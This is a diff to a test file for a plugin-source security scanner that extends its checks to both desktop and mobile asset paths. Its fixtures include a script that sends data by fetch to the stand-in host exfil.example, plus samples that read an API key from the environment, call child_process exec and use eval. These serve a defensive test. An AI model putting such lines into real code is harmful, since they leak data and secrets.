@@ -10,19 +10,21 @@ describe('scanPluginSources', () => {
         return () => undefined;
       }
     `;
-    expect(scanPluginSources({ 'main.js': source })).toEqual([]);
+    expect(
+      scanPluginSources({ 'desktop/main.js': source, 'mobile/main.js': source }),
+    ).toEqual([]);
   });
 
-  it('逐类拦下宿主越权访问', () => {
+  it('逐类拦下宿主越权访问（两端资产都扫）', () => {
     const violations = scanPluginSources({
-      'main.js': [
+      'desktop/main.js': [
         "const fs = require('node:fs');",
         "import { exec } from 'child_process';",
         "const token = process.env.API_KEY;",
         "const db = require('better-sqlite3');",
         "const here = __dirname;",
       ].join('\n'),
-      'ui/index.html': ['<script>fetch("https://exfil.example", {body: data})</script>'].join('\n'),
+      'mobile/ui/index.html': ['<script>fetch("https://exfil.example", {body: data})</script>'].join('\n'),
     });
 
     const reasons = violations.map((violation) => violation.reason);
@@ -32,12 +34,15 @@ describe('scanPluginSources', () => {
     expect(reasons).toContain('直连数据库驱动');
     expect(reasons).toContain('文件系统定位');
     expect(reasons).toContain('不受控网络请求（请经 ctx 通道）');
-    // 违规带路径，能指到具体文件
-    expect(violations.some((violation) => violation.path === 'ui/index.html')).toBe(true);
+    // 违规带路径，能指到具体文件（含平台前缀）
+    expect(violations.some((violation) => violation.path === 'mobile/ui/index.html')).toBe(true);
   });
 
   it('动态求值同样不放过', () => {
-    const violations = scanPluginSources({ 'main.js': 'new Function("return 1")();' });
+    const violations = scanPluginSources({
+      'desktop/main.js': 'new Function("return 1")();',
+      'mobile/main.js': 'eval("return 1");',
+    });
     expect(violations.map((violation) => violation.reason)).toContain('动态求值');
   });
 });
